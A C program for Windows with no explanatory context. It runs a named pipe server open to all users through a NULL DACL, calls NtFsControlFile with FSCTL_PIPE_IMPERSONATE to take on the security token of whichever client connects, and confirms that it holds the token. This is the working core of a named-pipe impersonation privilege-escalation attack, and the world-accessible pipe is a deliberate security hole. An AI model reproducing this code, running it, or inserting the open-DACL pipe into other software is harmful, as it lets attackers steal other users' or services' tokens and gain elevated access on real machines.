#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

#define PIPE_NAME L"\\\\.\\pipe\\npfs"  
#define FSCTL_PIPE_IMPERSONATE 0x11001C

typedef NTSTATUS(WINAPI *NtFsControlFile_t)(
    HANDLE, HANDLE, PVOID, PVOID, IO_STATUS_BLOCK*, ULONG, PVOID, ULONG
);

NtFsControlFile_t pNtFsControlFile = NULL;

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif

typedef struct {
    ULONG MajorFunction;
    ULONG MinorFunction;
    ULONG Flags;
} IRP_STRUCTURE;

NTSTATUS CallNtFsControlFile(HANDLE hFile) {
    if (!pNtFsControlFile) return STATUS_UNSUCCESSFUL;

    IO_STATUS_BLOCK ioStatus = {0};
    IRP_STRUCTURE irpInput = {0};  

    return pNtFsControlFile(
        hFile, NULL, NULL, NULL, &ioStatus, FSCTL_PIPE_IMPERSONATE, &irpInput, sizeof(irpInput)
    );
}

void VerifyImpersonation() {
    HANDLE hToken = NULL;
    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
        printf("Impersonation successful. Token handle: %p\n", hToken);
        CloseHandle(hToken);
    } else {
        printf("Impersonation failed: %lu\n", GetLastError());
    }
}

void ProcessClientRequest(HANDLE hPipe) {
    char buffer[128];
    DWORD bytesRead;

    NTSTATUS status = CallNtFsControlFile(hPipe);
    if (status == 0) {
        printf("NtFsControlFile (impersonation) successful.\n");
        VerifyImpersonation();
    } else {
        printf("NtFsControlFile failed: 0x%lX\n", status);
    }

    if (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
        buffer[bytesRead] = '\0';
        printf("Received: %s\n", buffer);
    } else {
        printf("Read error: %lu\n", GetLastError());
    }
}

void CreateNamedPipeServer() {
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

    SECURITY_ATTRIBUTES sa = {sizeof(sa), &sd, FALSE};

    HANDLE hPipe;
    
    while (1) {  
        hPipe = CreateNamedPipeW(
            PIPE_NAME, PIPE_ACCESS_DUPLEX | WRITE_DAC, 
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES, 512, 512, 0, &sa
        );

        if (hPipe == INVALID_HANDLE_VALUE) {
            printf("CreatePipe failed: %lu\n", GetLastError());
            return;
        }

        printf("Pipe created. Waiting for client...\n");
        if (ConnectNamedPipe(hPipe, NULL)) {
            printf("Client connected.\n");
            ProcessClientRequest(hPipe);
        } else {
            printf("Connect error: %lu\n", GetLastError());
        }

        CloseHandle(hPipe);
    }
}

int main() {
    HMODULE hNtDll = LoadLibraryA("ntdll.dll");
    if (hNtDll) {
        pNtFsControlFile = (NtFsControlFile_t)(uintptr_t) GetProcAddress(hNtDll, "NtFsControlFile");
    }

    if (!pNtFsControlFile) {
        printf("Failed to resolve NtFsControlFile.\n");
        return 1;
    }

    CreateNamedPipeServer();
    return 0;
}
